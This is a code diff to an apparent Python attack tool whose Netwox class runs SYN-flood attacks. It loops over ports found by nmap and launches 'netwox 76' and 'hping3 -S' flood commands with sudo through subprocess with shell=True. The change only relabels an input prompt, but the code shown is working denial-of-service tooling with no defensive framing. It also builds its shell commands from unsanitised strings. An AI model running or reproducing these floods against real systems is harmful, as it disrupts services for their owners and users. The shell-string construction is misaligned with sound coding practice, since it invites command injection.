@@ -8,7 +8,7 @@ import subprocess
 class Netwox:
 
     def syn_flood_network(self, nmap_o: nmap_object):
-        attack_time = int(input("Input attack time\n"))
+        attack_time = int(input("Input attack time (sec)\n"))
         for port in nmap_o.ports:
             cmd = ('sudo netwox 76 -i %s -p %s -s raw' % (nmap_o.name, port))
             print(cmd)
@@ -21,7 +21,7 @@ class Netwox:
 
     def syn_flood_attack(self, nmap_o: nmap_object, intensity: int):
         format_intensity = constants.intencity[intensity]
-        attack_time = int(input("Input attack time\n"))
+        attack_time = int(input("Input attack time (sec)\n"))
         for port in nmap_o.ports:
             cmd = ('sudo hping3 -S --%s -p %s %s' % (format_intensity, port, nmap_o.name))
             subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
